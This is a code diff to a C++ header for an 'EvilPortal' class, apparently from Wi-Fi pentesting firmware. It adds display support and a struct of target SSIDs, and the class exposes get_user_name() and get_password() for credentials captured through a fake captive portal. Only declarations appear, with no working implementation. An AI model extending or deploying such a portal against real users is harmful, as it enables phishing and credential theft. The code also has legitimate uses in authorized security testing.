@@ -7,6 +7,10 @@
 
 #include "configs.h"
 #include "settings.h"
+#ifdef HAS_SCREEN
+  #include "Display.h"
+  #include <LinkedList.h>
+#endif
 #ifndef WRITE_PACKETS_SERIAL
   #include "SDInterface.h"
 #else
@@ -17,6 +21,9 @@
 extern Settings settings_obj;
 #ifndef WRITE_PACKETS_SERIAL
   extern SDInterface sd_obj;
+#endif
+#ifdef HAS_SCREEN
+  extern Display display_obj;
 #endif
 extern Buffer buffer_obj; 
 
@@ -42,6 +49,13 @@ public:
   void handleRequest(AsyncWebServerRequest *request, char * index_html) {
     request->send_P(200, "text/html", index_html);
   }
+};
+
+struct ssid {
+  String essid;
+  uint8_t channel;
+  int bssid[6];
+  bool selected;
 };
 
 class EvilPortal {
@@ -71,13 +85,14 @@ class EvilPortal {
     void startAP();
     void addLog(String log, int len);
     void convertStringToUint8Array(const String& str, uint8_t*& buf, uint32_t& len);
+    void sendToDisplay(String msg);
 
   public:
     EvilPortal();
 
     String get_user_name();
     String get_password();
-    bool begin();
+    bool begin(LinkedList<ssid>* ssids);
     void main(uint8_t scan_mode);
 
 };
